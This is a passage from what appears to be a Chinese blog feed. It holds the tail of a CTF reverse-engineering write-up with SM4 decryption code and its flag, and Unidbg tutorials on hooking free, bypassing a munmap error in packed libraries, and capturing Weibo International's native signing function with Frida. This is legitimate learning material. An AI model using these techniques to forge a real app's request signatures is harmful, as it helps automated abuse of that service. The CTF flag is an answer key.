7f53dbcd,0x8a34b4b5,0xf26e4f3d,0x13d53dee,0xb680b299,0x4240c8ad,0xa6d4af0e,0x3596c8b4,0x38fca1ea,0xec29655f,0x23e84266,0x67419c9f,0x206dc5b7,0x73613507,0x62b28864,0xe8af0ee7,0x2fc69305,0x2564d596,0xdddd8af2,0xc1078980,0xdb4f1afe,0x05854090,0x55d8a274,0x7344e7c4,0xb53f2397,0x4142cdcd,0x964b3211,0xbc0689b5,0x0de89568,0xf3bedeeb,0xe3949f9a,0xd671f3dc,0x5d0ed608,0xbc184765,0xb715cd83,0x863993ad,0x8dc953a5,0xe2b1d806,0xefa090a9,0x134c69aa,0x3e20605d,0x0d6224d5,0xc291bc2c,0xec8bd8ff,0xa997ad73,0x6bc439f8,0xd2ed3a97,0x09d7fc40,0xb6bd7684,0x3f301769,0x117e733d,0x996f1927,0x3fd384fc,0x6e9fc9cf,0xaf77a75a,0xd4ae5533,0xf9bae359,0x769222e1,0xba539154,0xabd4e948,0xd2f4c382,0x65e29840,0x5777efe5,0x29d25a06,0x84d3c9f7,0x5a9234a6,0xdbb6d22e,0x1c5b4545,0x0439c612,0x9e74a3bd,0x3778dcff,0xaa782300,0xd12eed91,0x4f5c5749,0x5e974513,0xf477c7e0,0xf3268252,0x3a2c35a8,0x567e1f4e,0x078317ad,0x2c00bc03,0x192238eb,0x5969f7cf,0xdd2becce,0x0542fbf9,0x25875a10,0xf8c4bdd3,0x2f62633e,0x590efcea,0xb3a25587,0x4c11ef50,0xbd3c06d3,0x25004fa6,0xfbb7762b,0xebbe125b,0xdc996bb6,0xef4c91ce,0x5b83b58b,0xc1a60f22,0x4709bb5f,0x1e020ae1,0x4089de0e,0xaa60e0e3,0xd37eb696,0xa578c38f,0xa76881b5,0x12f54f4b,0xf03cf464,0x0e2c65b9,0x1c114831,0x1265bcb8,0x231fb7a2,0x1b37c1d7,0x06f50c51,0xb345bafb,0x030761f7,0x3157a866,0x144e637d,0xa2ed81ac,0xdee3e523,0x8b931d80,0x542eac9c,0x9c450925,0x8792a280,0x2b98cbe1,0xa95b846c,0x0bb2ebeb,0x9911cff2,0xb4a04d42,0x9fa3a9a4,0x64d589fa,0xe3711313,0xef1d6fec,0xfa5f87cf,0x999c8a08,0x4ad27d1e,0x72e1b68f,0xae2ba80f,0x09782f00,0x776da9de,0x803e6ac4,0xf0a33e75,0x6188974a,0xa508b687,0x2eb38b86,0xb1a697ab,0xcd2faa3f,0x03f0caae,0x3fa0b4d4,0xc42668ed,0x799b1771,0x7c2fa832,0xba77acba,0x4faee12b,0xde494962,0x9c058265,0xbb0536a0,0x850a5c48,0x2d219617,0x88c5019b,0x0409d9c3,0x42340a52,0x46e3e475,0x2303c445,0x7a406981,0x5b5b13b3,0x0619a492,0xf81dd6b7,0x82ab8ba0,0xa4d9c038,0x347ceb04,0x07180570,0x03872aa7,0x68a0265d,0x7ddd11c1,0x60419a38,0xd815a0bd,0x12dfe023,0x2c0387c4,0x94e0b79f,0xd7a7158e,0x00b2dca6,0x215aa09a,0xd1eb9583,0x074807dd,0x532abe2d,0x161325bd,0xdc761f5c,0xefeb2988,0x48f9ad08,0x50e65e40,0x6afb726a,0xfca0c8e7,0xacdd35eb,0xa27de08b,0xdf9c496c,0xc4acd844,0x9c44abc4,0x11482d6c,0xe97d5b8b,0x10db7aa4,0x94eda0ee,0x6c50c7de,0xe478a123,0xd4cb759e,0x5322e827,0x3b46d700,0x8e89aee6,0x044d6d84,0x2ba93fdd,0x91291c05,0x78eea0de,0x5f2a4c02,0x46d5f5cd,0x235a3c73,0x4106e3e6,0x8c2ab2f2,0xf251414c,0x2999631f,0xa83f4a4f,0x985f2c5e,0x0c974c16,0x4117df31,0x89eb420a,0x07f7c805,0x37cd809f,0xb6487bee,0xa2cb2d2f,0x89a531b0,0xb7323c99,0x7d4594ab,0x016f5c01,0xbb0c537b,0x39a513dd,0xea13f990,0x45901129,0x4f16f334,0xb2b1c416,0x23dda7ae,0x60ea2821,0x65b4aa30,0x258adf7f,0xe5f49422,0xbd8cc6eb,0x00c5295e,0x5b975eaa,0xb8ae5e61,0x7ed3aedd,0x75e2dba4,0x4f88818f,0xe5bfc0d9,0xace59633,0xca5fd792,0x1e2f45e6,0x909f0c9d,0x0553e27e,0x633807cc,0x2293e7e3,0x9f78ea3b,0x33600a85,0xae63c908,0x945732a9,0x1e7bb6d6,0x86b5682c,0x5145da19,0x0b0a0fe7,0xb8681fe5,0x4f9702e4,0x79baf040,0xd431ff82,0x855f9052,0xc0b58731,0x4ff395b6,0x1e99c0d1,0xc75d602c,0x0ff218d4,0x2731dbcf,0xe86d2b24,0x369d8687,0xb80bf37c,0x38550770,0x86f7d68b,0x7d44a1da,0xf832f9b5,0xcf185af5,0x0c5c0d98,0xe2031910,0x7e3f88ab,0x7f60ba17,0x7b35ffed,0x4338eb0d,0xf02e1e3d,0x594d8918,0xe4bf2809,0xe0b4d05f,0x4f7b38f1,0xdca767ec,0x01e3973a,0x609aa130,0x2ada2f0e,0x2f75c136,0x8d2ebedb,0xbfa7303e,0xc6d39a45,0x48c99b87,0xbc036fe6,0x93463f35,0x6340b695,0xf3d1521a,0xf978d8ff,0xc3527463,0x4ac4f6ca,0x9626cfe8,0x2cafdb7a,0xcfdb4dc5,0x19c7642c,0x82e605a2,0xe18573ab,0xa73e72d0,0xc2ec9ded,0x2ebba90b,0xad425d0f,0x4cd9e918,0x36c76a47,0x7c80885c,0x23044937,0xf2e4a267,0xd6bd5f8c,0xd0c5343b,0x74128c7f,0xb4c3510e,0x17d557db,0x65d603f9,0x69c12675,0xc8b65980,0x688571e0,0xe1c3cbc5,0xa4daf101,0x3ee2c779,0x1ce39564,0x43a17b0b,0x3d0ac6bd,0x1f1e3f2e,0xaf8288ee,0x5dfc1fcd,0x8b81786d,0xf314e006,0xf14233e7,0xe831e571,0x74b61e27,0xbdfa7bcc,0x9af4806f,0x14d17099,0x2531db08,0x99c098d8,0x552af212,0xadb688d6,0x287ff99f,0xfeae9c90,0xb4caa004,0x7309c1e6,0xba56cefd,0x9c49116e,0xf1231c94,0xb1ec2bb8,0xe336a029,0x75da09a3,0x74a57173,0x7df25e5a,0x308c8478,0x9a7a842e,0x70080708,0x3a5451f1,0x738147b6,0xcc777d69,0xee2abe99,0x52237bfb,0x5b682f06,0x4ad24522,0x27de7fe0,0x1701f718,0x735238ca,0x1caf8db3,0x402ed473,0xd30d300b,0xed592c04,0xa7c55270,0xd41ed6b9,0x1d04abbd,0x9665ea52,0x0013775c,0xb799941f &#125;;    word_t state[4] = &#123; 0 &#125;;    word_t plaintext[11316] = &#123; 0 &#125;;    word_t master_key[4] = &#123; 0xE52BCC34, 0x1F1B5B18, 0x5F1ED75A, 0xF108FE7F &#125;;    word_t working_key[4] = &#123; 0 &#125;;    word_t round_key[32];    generate_round_keys(master_key, working_key, round_key);        for (int i = 0; i &lt; 2829; i++) &#123;        decrypt_sm4(&amp;ciphertext[i*4], round_key, &amp;plaintext[i*4]);    &#125;    for (int i = 0; i &lt; 11316; i++) &#123;        byte_t* byte_ptr = (byte_t*)&amp;plaintext[i];        for (int j = 3; j &gt;= 0; j--) &#123;            putchar(byte_ptr[j]);        &#125;    &#125;    printf(&quot;\n&quot;);    return 0;&#125;</code></pre><p>然后将解密得到的数据，放进cyberchef进行解码<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250608192338334.png" alt="image-20250608192338334"></p><p>保存图片，然后上传到模拟器的相册里<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250608192440560.png" alt="image-20250608192440560"></p><p>然后就可以上传了</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250608192459390.png" alt="image-20250608192459390"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250608192507689.png" alt="image-20250608192507689"></p><p>flag就是解锁密码加上指定的字符串，完了进行md5加密<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250608192744926.png" alt="image-20250608192744926"></p><p><strong>flag{038b53ab86abe7274193ea8e5b9ff7bf}</strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> WritesUp </tag>
            
            <tag> Harmony </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>补库函数(五)</title>
      <link href="/2025/06/04/%E8%A1%A5%E5%BA%93%E5%87%BD%E6%95%B0%EF%BC%88%E4%BA%94%EF%BC%89/"/>
      <url>/2025/06/04/%E8%A1%A5%E5%BA%93%E5%87%BD%E6%95%B0%EF%BC%88%E4%BA%94%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="补库函数（五）"><a href="#补库函数（五）" class="headerlink" title="补库函数（五）"></a>补库函数（五）</h1><h3 id="一、引言"><a href="#一、引言" class="headerlink" title="一、引言"></a>一、引言</h3><p>本篇记录内存相关的库函数、系统调用处理。</p><h3 id="二、Free"><a href="#二、Free" class="headerlink" title="二、Free"></a>二、Free</h3><p>free函数是重要的内存释放函数，原型如下。</p><pre><code class="language-c">void free(void *ptr)</code></pre><p>Unidbg在内存管理方面存在一些问题，在内存的释放上尤为明显，munmap以及free都有不低的出错概率。先讨论free，常见报错如下。</p><pre><code class="language-bash">Invalid address 0x40175000 passed to free: value not allocated[crash]A/libc: Invalid address 0x40175000 passed to free: value not allocated</code></pre><p>遇到这个报错，最简单的处理方法就是hook free函数，替换它的实现，让它什么都不做就直接返回。这里我用Whale来实现，让它直接返回，且返回值是0，即释放成功之意。</p><pre><code class="language-Java">public void patchFree()&#123;    IWhale whale = Whale.getInstance(emulator);    Symbol free = emulator.getMemory().findModule(&quot;libc.so&quot;).findSymbolByName(&quot;free&quot;);    whale.inlineHookFunction(free, new ReplaceCallback() &#123;        @Override        public HookStatus onCall(Emulator&lt;?&gt; emulator, long originFunction) &#123;            System.out.println(&quot;WInlineHookFunction free=&quot; + emulator.getContext().getPointerArg(0));            return HookStatus.LR(emulator, 0);        &#125;    &#125;);&#125;</code></pre><p>你可以使用xHook、HookZz或者其他感兴趣的Unidbg内置Hook方案。你可能会觉得这么做有些浪费，很多应该释放的内存没有得到释放，那么也可以根据报错，对报错的待释放内存做处理，比如只有指针地址是0x40175000、0x40176000 的两处释放失败时，代码如下。</p><pre><code class="language-Java">public void patchFree()&#123;    IWhale whale = Whale.getInstance(emulator);    Symbol free = emulator.getMemory().findModule(&quot;libc.so&quot;).findSymbolByName(&quot;free&quot;);    whale.inlineHookFunction(free, new ReplaceCallback() &#123;        @Override        public HookStatus onCall(Emulator&lt;?&gt; emulator, long originFunction) &#123;            System.out.println(&quot;WInlineHookFunction free=&quot; + emulator.getContext().getPointerArg(0));            long addr = emulator.getContext().getPointerArg(0).peer;            if(addr == 0x40175000 | addr == 0x40176000)&#123;                return HookStatus.LR(emulator, 0);            &#125;else &#123;                return HookStatus.RET(emulator, originFunction);            &#125;        &#125;    &#125;);&#125;</code></pre><h3 id="三、munmap"><a href="#三、munmap" class="headerlink" title="三、munmap"></a>三、munmap</h3><p>简单谈谈munmap，它的实现位于<strong>src&#x2F;main&#x2F;java&#x2F;com&#x2F;github&#x2F;unidbg&#x2F;spi&#x2F;AbstractLoader.java</strong>。它出现的频率太高了，这里有个样本进行展示。</p><p>样本：wanggetong.apk(附件详见参考)。Unidbg示例代码如下</p><pre><code class="language-Java">package com.munmap;import com.github.unidbg.AndroidEmulator;import com.github.unidbg.arm.backend.Unicorn2Factory;import com.github.unidbg.linux.android.AndroidEmulatorBuilder;import com.github.unidbg.linux.android.AndroidResolver;import com.github.unidbg.linux.android.dvm.AbstractJni;import com.github.unidbg.linux.android.dvm.DalvikModule;import com.github.unidbg.linux.android.dvm.DvmObject;import com.github.unidbg.linux.android.dvm.VM;import com.github.unidbg.memory.Memory;import java.io.File;public class MUNMAP extends AbstractJni &#123;    private final AndroidEmulator emulator;    private final DvmObject BlackBox;    private final VM vm;    public MUNMAP() &#123;        emulator = AndroidEmulatorBuilder                .for32Bit()                .addBackendFactory(new Unicorn2Factory(true))                .build();        Memory memory = emulator.getMemory();        memory.setLibraryResolver(new AndroidResolver(23));        vm = emulator.createDalvikVM(new File(&quot;D:\\Compilation_Enviroment\\unidbg-master\\unidbg-android\\src\\test\\java\\com\\munmap\\wanggetong.apk&quot;));        vm.setJni(this);        vm.setVerbose(true);        DalvikModule dm = vm.loadLibrary(&quot;msec&quot;, true);        BlackBox = vm.resolveClass(&quot;com.autohome.mainlib.common.util.BlackBox&quot;).newObject(null);        dm.callJNI_OnLoad(emulator);    &#125;    public static void main(String[] args) &#123;        MUNMAP wgt = new MUNMAP();    &#125;&#125;</code></pre><p>运行报错<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250604185128267.png" alt="image-20250604185128267"></p><p>报错中的0xffffffff是什么，是Unidbg不支持样本所采用的JNI版本？不是。</p><p>让我们回忆一下JNI_OnLoad的开发习惯，比如下面这样。</p><pre><code class="language-c++">//注册函数映射JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* vm, void* reserved) &#123;    JNIEnv *pEnv = NULL;    //获取环境    jint ret = vm-&gt;GetEnv((void**) &amp;pEnv, JNI_VERSION_1_6);    if (ret != JNI_OK) &#123;        LOGE(&quot;jni_replace JVM ERROR:GetEnv&quot;);        return -1;    &#125;    //在&#123;&#125;里面进行方法映射编写，第一个是java端方法名，第二个是方法签名，第三个是c语言形式签名（括号内表示方法返回值）    JNINativeMethod g_Methods[] = &#123;&#123;&quot;jniOnLoadTest&quot;, &quot;()V&quot;, (void*) onLoadTest&#125;,                                   &#123;&quot;jniOnload1&quot;, &quot;(Lzqc/com/example/Person;)Ljava/lang/String;&quot;, (jstring*)onloadTest1&#125;    &#125;;    jclass cls = pEnv-&gt;FindClass(&quot;zqc/com/example/NativeTest&quot;);    if (cls == NULL) &#123;        LOGE(&quot;FindClass Error&quot;);        return -1;    &#125;    //动态注册本地方法    ret = pEnv-&gt;RegisterNatives(cls, g_Methods,sizeof(g_Methods) / sizeof(g_Methods[0]));    if (ret != JNI_OK) &#123;        LOGE(&quot;Register Error&quot;);        return -1;    &#125;    //返回版本    return JNI_VERSION_1_6;&#125;</code></pre><p>JNI_OnLoad的返回值必须是JNI的版本信息，目前支持1.4、1.6、1.8三个版本，当返回三者之一时表示一切正常，如果像表示JNI_OnLoad处理出错的意思，只需要返回其他值即可，按照惯例一般返回-1，也就是十六进制的0xffffffff，比如上面贴的demo代码就是这样。</p><p>因为这里Unidbg的报错，并不是说样本真采用了什么其他的JNI版本，而只是表明，样本在早先的JNI_OnLoad处理里遇到了问题，直接走到了<strong>return -1</strong>。</p><p>所以解决它的问题就是日志往上翻，找到最早报错在哪里<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250604185707554.png" alt="image-20250604185707554"></p><p>可以看到是munmap报错，点进去看看，发现是下图这样一个位置<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250604185856008.png" alt="image-20250604185856008"></p><pre><code class="language-Java">if (segment == null || segment.size &lt; aligned) &#123;    throw new IllegalStateException(&quot;munmap aligned=0x&quot; + Long.toHexString(aligned) + &quot;, start=0x&quot; + Long.toHexString(start));&#125;</code></pre><p>表面是munmap的处理有问题，本质上依然是Unidbg在内存管理、模块加载相关的处理逻辑上不健全，所以这里主动抛出了一个异常。</p><p>如果SO加固，比如加个UPX壳，那么往往就会遇到这个报错，如果你只想绕过这个问题，那么只需要注释掉这个<strong>throw</strong>即可，如果你想彻底解决Unidbg在这个逻辑下的问题，那么需要对比Unidbg ElfLoader逻辑和Linker的差异，找到这个问题的根源。</p><p>我这里简单注释一下<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250604190255452.png" alt="image-20250604190255452"></p><p>然后运行就进入正常的补JNI逻辑。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250604190428290.png" alt="image-20250604190428290"></p><p>感兴趣的读者可以自行尝试。</p><p>mmap和munmap相关的问题，在Unidbg中很容易出现，而且往往都是发生在加固SO的解密和内存释放阶段，这里要阐述两点。</p><p>一是这说明Unidbg在内存加载方面的处理逻辑做不到位，有漏洞。</p><p>二是不能因此认为**“Unidbg不能处理加固的SO”**，只不过是SO加固和解密时会更多的使用到系统层的各种功能和特性，而Unidbg对它们的支持度不那么高，相对来说更容易出问题罢了。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>[补库函数（五）](<a href="https://www.yuque.com/lilac-2hqvv/xdwlsg/bzoykwvuim3hkz2o#">https://www.yuque.com/lilac-2hqvv/xdwlsg/bzoykwvuim3hkz2o?#</a> 《补库函数（五）》)</p>]]></content>
      
      
      <categories>
          
          <category> Unidbg学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Unidbg </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从实践中学习unidbg使用(二)</title>
      <link href="/2025/06/02/%E4%BB%8E%E5%AE%9E%E8%B7%B5%E4%B8%AD%E5%AD%A6%E4%B9%A0unidbg%E4%BD%BF%E7%94%A8(%E4%BA%8C)/"/>
      <url>/2025/06/02/%E4%BB%8E%E5%AE%9E%E8%B7%B5%E4%B8%AD%E5%AD%A6%E4%B9%A0unidbg%E4%BD%BF%E7%94%A8(%E4%BA%8C)/</url>
      
        <content type="html"><![CDATA[<h1 id="从实践中学习unidbg使用-二"><a href="#从实践中学习unidbg使用-二" class="headerlink" title="从实践中学习unidbg使用(二)"></a>从实践中学习unidbg使用(二)</h1><h3 id="一、引言"><a href="#一、引言" class="headerlink" title="一、引言"></a>一、引言</h3><p>本篇中的APK详见参考文章</p><p>目标APK: sinaInternational.apk</p><p>目标方法实现：libutility.so</p><h3 id="二、任务描述"><a href="#二、任务描述" class="headerlink" title="二、任务描述"></a>二、任务描述</h3><p>apk放到JADX中进行反编译，并找到<strong>com.sina.weibo.security</strong>类。目标函数是其中的calculateS函数</p><pre><code class="language-Java">package com.sina.weibo.security;import android.content.Context;import android.net.wifi.WifiInfo;import android.net.wifi.WifiManager;import android.telephony.TelephonyManager;import android.text.TextUtils;import com.taobao.accs.utl.UtilityImpl;import com.umeng.message.MsgConstant;import com.weico.international.WApplication;import permissions.dispatcher.PermissionUtils;/* loaded from: classes.dex */public class WeiboSecurityUtils &#123;    public static WeiboSecurityUtils instance;    private static Object mCalculateSLock;    private static String sIValue;    private static String sImei;    private static String sMac;    private static String sSeed;    private static String sValue;    public native String calculateS(Context context, String str, String str2);    public native String getIValue(Context context, String str);    static &#123;        System.loadLibrary(&quot;utility&quot;);        instance = null;        sImei = &quot;&quot;;        sMac = &quot;&quot;;        mCalculateSLock = new Object();    &#125;    private WeiboSecurityUtils() &#123;    &#125;    public static synchronized WeiboSecurityUtils getInstance() &#123;        WeiboSecurityUtils weiboSecurityUtils;        synchronized (WeiboSecurityUtils.class) &#123;            if (instance == null) &#123;                instance = new WeiboSecurityUtils();            &#125;            weiboSecurityUtils = instance;        &#125;        return weiboSecurityUtils;    &#125;    public static String calculateSInJava(Context context, String srcArray, String pin) &#123;        String str;        synchronized (mCalculateSLock) &#123;            if (srcArray.equals(sSeed) &amp;&amp; !TextUtils.isEmpty(sValue)) &#123;                str = sValue;            &#125; else if (context != null) &#123;                sSeed = srcArray;                sValue = getInstance().calculateS(context.getApplicationContext(), srcArray, pin);                str = sValue;            &#125; else &#123;                str = &quot;&quot;;            &#125;        &#125;        return str;    &#125;    public static String getIValue(Context context) &#123;        if (TextUtils.isEmpty(sIValue)) &#123;            String deviceSerial = getImei(context);            if (TextUtils.isEmpty(deviceSerial)) &#123;                deviceSerial = getWifiMac(context);            &#125;            if (TextUtils.isEmpty(deviceSerial)) &#123;                deviceSerial = &quot;000000000000000&quot;;            &#125;            if (context != null &amp;&amp; !TextUtils.isEmpty(deviceSerial)) &#123;                String iValue = getInstance().getIValue(context.getApplicationContext(), deviceSerial);                sIValue = iValue;                return iValue;            &#125;            return &quot;&quot;;        &#125;        return sIValue;    &#125;    public static String getImei(Context context) &#123;        if (TextUtils.isEmpty(sImei) &amp;&amp; context != null) &#123;            if (PermissionUtils.hasSelfPermissions(WApplication.cContext, MsgConstant.PERMISSION_READ_PHONE_STATE)) &#123;                TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(&quot;phone&quot;);                sImei = telephonyManager.getDeviceId();            &#125; else &#123;                sImei = null;            &#125;        &#125;        return sImei;    &#125;    public static String getWifiMac(Context context) &#123;        if (TextUtils.isEmpty(sMac) &amp;&amp; context != null) &#123;            WifiManager wifi = (WifiManager) context.getApplicationContext().getSystemService(UtilityImpl.NET_TYPE_WIFI);            WifiInfo mac = wifi.getConnectionInfo();            sMac = mac != null ? mac.getMacAddress() : &quot;&quot;;        &#125;        return sMac;    &#125;&#125;</code></pre><p>改类的大体分析如下</p><table><thead><tr><th>功能</th><th>方法</th><th>说明</th></tr></thead><tbody><tr><td>加密计算</td><td>calculateS &#x2F; calculateSInJava</td><td>基于种子和 PIN，生成加密签名</td></tr><tr><td>获取设备标识</td><td>getImei, getWifiMac</td><td>尝试获取唯一设备标识（IMEI 或 MAC）</td></tr><tr><td>获取加密设备标识</td><td>getIValue</td><td>基于设备信息调用 native 加密逻辑生成值</td></tr><tr><td>单例管理</td><td>getInstance</td><td>保证类唯一实例，控制资源和缓存</td></tr></tbody></table><p>接下来就是使用Frida hook这个方法，获取其入参和返回值，以下是hook脚本</p><pre><code class="language-js">setTimeout(function () &#123;  Java.perform(function () &#123;    let WeiboSecurityUtils = Java.use(      &quot;com.sina.weibo.security.WeiboSecurityUtils&quot;    );    WeiboSecurityUtils[&quot;calculateS&quot;].implementation = function (      context,      str,      str2    ) &#123;      console.log(        `WeiboSecurityUtils.calculateS is called: context=$&#123;context&#125;, str=$&#123;str&#125;, str2=$&#123;str2&#125;`      );      let result = this[&quot;calculateS&quot;](context, str, str2);      console.log(`WeiboSecurityUtils.calculateS result=$&#123;result&#125;`);      return result;    &#125;;  &#125;);&#125;, 5000);</code></pre><p>然后还是和上一篇文章**从实践中学习unidbg使用(一)**一样，主动使用获取到的入参进行附加进程主动调用该方法，然后获取到其返回值，再使用unidbg复现Frida hook的结果。主动调用的hook脚本可参考以下</p><pre><code class="language-js">function callcalculateS() &#123;  Java.perform(function () &#123;    let WeiboSecurityUtils = Java.use(      &quot;com.sina.weibo.security.WeiboSecurityUtils&quot;    );    let current_application = Java.use(      &quot;android.app.ActivityThread&quot;    ).currentApplication();    let arg1 = current_application.getApplicationContext();    let arg2 = &quot;hello world&quot;;    let arg3 = &quot;123456&quot;;    let ret = WeiboSecurityUtils.$new().calculateS(arg1, arg2, arg3);    console.log(&quot;ret: &quot; + ret);  &#125;);&#125;callcalculateS();</code></pre><p>结果为 d74a75bb</p><h3 id="三、初始化"><a href="#三、初始化" class="headerlink" title="三、初始化"></a>三、初始化</h3><pre><code class="language-Java">package com.test1;import com.github.unidbg.AndroidEmulator;import com.github.unidbg.arm.backend.Unicorn2Factory;import com.github.unidbg.linux.android.AndroidEmulatorBuilder;import com.github.unidbg.linux.android.AndroidResolver;import com.github.unidbg.linux.android.dvm.AbstractJni;import com.github.unidbg.linux.android.dvm.DalvikModule;import com.github.unidbg.linux.android.dvm.DvmClass;import com.github.unidbg.linux.android.dvm.VM;import com.github.unidbg.memory.Memory;import java.io.File;public class TEST1 extends AbstractJni &#123;    private final AndroidEmulator emulator;    private final VM vm;    private final DvmClass WeiboSecurityUtils;    public TEST1() &#123;        emulator = AndroidEmulatorBuilder                .for32Bit()                .addBackendFactory(new Unicorn2Factory(true))                .setProcessName(&quot;com.weico.international&quot;)                .build();        Memory memory = emulator.getMemory();        memory.setLibraryResolver(new AndroidResolver(23));        vm = emulator.createDalvikVM(new File(&quot;D:\\Compilation_Enviroment\\unidbg-master\\unidbg-android\\src\\test\\java\\com\\test1\\sinaInternational.apk&quot;));        //设置当前类为虚拟机的JNI接口实现，即告诉虚拟机，如果 native 层调用 Java 方法、访问 Java 字段，使用我（这个类）来处理。        vm.setJni(this);        //打开 unidbg 的详细日志输出（verbose mode）        vm.setVerbose(true);        DalvikModule dm = vm.loadLibrary(&quot;utility&quot;, true);        WeiboSecurityUtils = vm.resolveClass(&quot;com/sina/weibo/security/WeiboSecurityUtils&quot;);        dm.callJNI_OnLoad(emulator);    &#125;    public static void main(String[] args) &#123;        TEST1 test1 = new TEST1();    &#125;&#125;</code></pre><p>apk lib 目录下只包含armeabi动态库，所以是ARM32。这篇讨论创建虚拟机对象、加载 SO 这两件事。</p><h4 id="3-1创建虚拟机"><a href="#3-1创建虚拟机" class="headerlink" title="3.1创建虚拟机"></a>3.1创建虚拟机</h4><p>Unidbg的VM主要用于处理JNI逻辑，这里我们通过如下方式创建。</p><pre><code class="language-Java">vm = emulator.createDalvikVM(new File(&quot;unidbg-android/src/test/resources/weibo/sinaInternational.apk&quot;));</code></pre><p><strong>createDalvikVM</strong>有两个重载方法，建议使用第二个。</p><pre><code class="language-Java">//创建虚拟机VM dalvikVM = emulator.createDalvikVM();//创建虚拟机并指定APK文件VM dalvikVM = emulator.createDalvikVM(new File(&quot;apk file path&quot;));</code></pre><p>加载APK这一行行为让很多人对Unidbg产生了误解，觉得它不是SO模拟器，而是应用级的模拟器，就像雷电或者夜神模拟器那样。</p><p>事实上，Unidbg加载APK并非要做执行DEX甚至是运行APK这样的大事，相反，它只是在做一些小事，主要包括下面两部分</p><ol><li>解析APK基本信息，减少使用者在补JNI环境上的工作量。Unidbg会解析APK的版本名、版本号、包名、APK签名等信息。如果样本通过JNI调用获取这些信息、Unidbg会替我们做处理。如果没有加载APK，这些逻辑就需要我们去补环境，平添了不少工作量。</li><li>解析管理APK资源文件。加载APK后可以通过<strong>openAsset</strong>获取<strong>APK assets</strong>目录下的文件。如果样本通过<strong>AAssetManager_open</strong>等函数访问APK的<strong>assets</strong>，Unidbg会替我们做处理。</li></ol><p>综上所述，创建虚拟机时加载APK会更省事。除此之外，Unidbg使用apk-parser这个开源项目完成APK的解析工作，读者可以在自己的项目里使用它。</p><pre><code class="language-Java">&lt;dependency&gt;    &lt;groupId&gt;net.dongliu&lt;/groupId&gt;    &lt;artifactId&gt;apk-parser&lt;/artifactId&gt;    &lt;version&gt;2.6.10&lt;/version&gt;&lt;/dependency&gt;</code></pre><h4 id="3-2加载SO"><a href="#3-2加载SO" class="headerlink" title="3.2加载SO"></a>3.2加载SO</h4><p>我们通过loadLibrary API将SO加载到Unidbg中，它有数个重载方法，下面两个使用最多。</p><pre><code class="language-Java">//参数一: 动态库或可执行ELF文件//参数二: 是否必须执行 init_proc、init_array 这些初始化函数DalvikModule loadLibrary(File elfFile, boolean forceCallInit);//参数一：动态库或可执行ELF的文件名//参数二: 是否必须执行 init_proc、init_array 这些初始化函数DalvikModule loadLibrary(String libname, boolean forceCallInit);</code></pre><p>可以发现区别在于第一个参数，前者传入文件后者则传入动态库的名字。</p><p>后者在使用上近似于Java的<strong>System.loadLibrary(soName)</strong>，名字要掐头去尾，如libkwsgmain.so对应为kwsgmain。</p><pre><code class="language-Java">vm.loadLibrary(&quot;kwsgmain&quot;, true);</code></pre><p>loadLibrary内部会为libname再添头添尾。</p><pre><code class="language-Java">@Overridepublic final DalvikModule loadLibrary(String libname, boolean forceCallInit) &#123;    String soName = &quot;lib&quot; + libname + &quot;.so&quot;;    LibraryFile libraryFile = findLibrary(soName);    if (libraryFile == null) &#123;        throw new IllegalStateException(&quot;load library failed: &quot; + libname);    &#125;    Module module = emulator.getMemory().load(libraryFile, forceCallInit);    return new DalvikModule(this, module);&#125;</code></pre><p>只传入名字如何找到对应的SO文件并进行加载？这就依赖于3.1中所提到的加载APK，Unidbg会去APK的lib目录下寻找目标SO文件，如果不加载就没办法处理，下面看看具体代码。</p><p>首先是32位的处理，去找<strong>armeabi-v7a</strong>以及<strong>armeabi</strong>。</p><pre><code class="language-Java">byte[] loadLibraryData(Apk apk, String soName) &#123;    byte[] soData = apk.getFileData(&quot;lib/armeabi-v7a/&quot; + soName);    if (soData != null) &#123;        if (log.isDebugEnabled()) &#123;            log.debug(&quot;resolve armeabi-v7a library: &quot; + soName);        &#125;        return soData;    &#125;    soData = apk.getFileData(&quot;lib/armeabi/&quot; + soName);    if (soData != null &amp;&amp; log.isDebugEnabled()) &#123;        log.debug(&quot;resolve armeabi library: &quot; + soName);    &#125;    return soData;&#125;</code></pre><p>再看看64位，去<strong>arm64-v8a</strong>下找。</p><pre><code class="language-Java">byte[] loadLibraryData(Apk apk, String soName) &#123;    byte[] soData = apk.getFileData(&quot;lib/arm64-v8a/&quot; + soName);    if (soData != null) &#123;        if (log.isDebugEnabled()) &#123;            log.debug(&quot;resolve arm64-v8a library: &quot; + soName);        &#125;        return soData;    &#125; else &#123;        return null;    &#125;&#125;</code></pre><p>loadLibrary还有一个重载，直接传入字节数组。它的主要应用场景是加载从真实环境中Dump出的内存。</p><pre><code class="language-Java">loadLibrary(String libname, byte[] raw, boolean forceCallInit)</code></pre><p>这个API缺少维护和优化，并不好用。</p><p>在一般情况下，选择哪一个加载SO文件？我建议使用传入动态库名字的那一个，因为它能更好的处理SO的依赖模块。</p><h4 id="3-3加载依赖模块"><a href="#3-3加载依赖模块" class="headerlink" title="3.3加载依赖模块"></a>3.3加载依赖模块</h4><p>几乎没有SO文件可以不依赖任何外部库就正常工作，比如各种各样的C标准库函数、Android FrameWork提供的一些库，以及样本的自定义库等等。</p><p>可以在IDA反汇编界面的头部查看依赖库信息，又或者使用objdump、readelf等工具也可以。<br><img 